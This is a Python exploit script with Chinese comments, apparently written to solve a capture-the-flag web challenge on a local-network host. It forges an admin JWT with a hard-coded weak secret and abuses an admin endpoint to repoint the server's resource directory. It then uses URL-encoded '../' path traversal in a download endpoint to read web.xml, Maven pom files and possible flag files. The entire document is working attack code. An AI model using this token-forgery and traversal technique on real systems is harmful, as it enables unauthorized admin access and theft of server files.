#!/usr/bin/env python3
"""
详细探索文件系统
"""

import requests
import jwt
import json
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def detailed_explore(session):
    """详细探索并显示所有文件"""
    print("[*] 详细探索文件系统...")
    
    paths_to_check = [
        ("webapp根", "/"),
        ("当前目录", "."),
        ("WEB-INF", "WEB-INF"),
        ("WEB-INF/classes", "WEB-INF/classes"),
        ("META-INF", "META-INF"),
    ]
    
    for desc, path in paths_to_check:
        print(f"\n{'='*60}")
        print(f"路径: {desc} ({path})")
        print(f"{'='*60}")
        
        r = session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": path})
        if r.status_code != 200:
            print(f"[!] 设置resourceDir失败")
            continue
        
        r = session.get(f"{BASE_URL}/dashboard/list")
        if r.status_code != 200:
            print(f"[!] 列出文件失败: {r.status_code}")
            print(f"响应: {r.text[:300]}")
            continue
        
        try:
            files = json.loads(r.text)
            print_files(files, "", 0)
        except Exception as e:
            print(f"[!] 解析失败: {e}")
            print(f"原始响应: {r.text[:500]}")

def print_files(files, prefix="", depth=0):
    """递归打印文件列表"""
    if depth > 2:  # 限制深度
        return
    
    for file in files:
        name = file.get('name', '')
        path = file.get('path', '')
        is_dir = file.get('isDir', False)
        size = file.get('size', 0)
        
        indent = "  " * depth
        type_str = "[DIR]" if is_dir else f"[{size}B]"
        
        print(f"{indent}{type_str} {name}")
        
        # 如果有children，递归打印
        if 'children' in file and file['children']:
            print_files(file['children'], prefix + name + "/", depth + 1)

def try_read_specific_files(session):
    """尝试读取特定的可疑文件"""
    print("\n[*] 尝试读取可疑文件...")
    
    # 设置到根目录
    session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": "/"})
    
    # 尝试读取一些可能包含flag的文件
    possible_flag_files = [
        "flag.txt",
        "flag",
        "FLAG.txt",
        "secret.txt",
        "README.txt",
        "META-INF/MANIFEST.MF",
        "WEB-INF/web.xml",
    ]
    
    for filename in possible_flag_files:
        print(f"\n[*] 尝试: {filename}")
        
        # 通过rewrite规则读取
        r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2f{filename}")
        
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 10000:
            print(f"[+] 成功读取 ({len(r.text)} bytes):")
            print(r.text)
            
            if 'pcb{' in r.text or 'flag{' in r.text or 'FLAG{' in r.text:
                print(f"\n[!!! 找到FLAG !!!]")
                return r.text

def check_pom_files(session):
    """检查Maven pom文件"""
    print("\n[*] 检查pom.xml文件...")
    
    session.post(f"{BASE_URL}/admin/challengeResourceDir", data={"new-path": "META-INF/maven/myapp/servlet-test"})
    
    r = session.get(f"{BASE_URL}/dashboard/list")
    if r.status_code == 200:
        try:
            files = json.loads(r.text)
            print(f"[*] 发现文件:")
            for f in files:
                print(f"  - {f.get('name')}")
                
                # 尝试读取pom文件
                if 'pom' in f.get('name', '').lower():
                    content_r = session.get(f"{BASE_URL}/download?path=uploads%2f..%2fMETA-INF%2fmaven%2fmyapp%2fservlet-test%2f{f['name']}")
                    if content_r.status_code == 200:
                        print(f"\n[+] {f['name']}内容:")
                        print(content_r.text)
        except Exception as e:
            print(f"[!] 错误: {e}")

def main():
    print(f"[*] 详细文件系统探索 {BASE_URL}")
    
    session = create_admin_session()
    
    # 详细探索
    detailed_explore(session)
    
    # 尝试读取特定文件
    try_read_specific_files(session)
    
    # 检查pom文件
    check_pom_files(session)

if __name__ == "__main__":
    main()
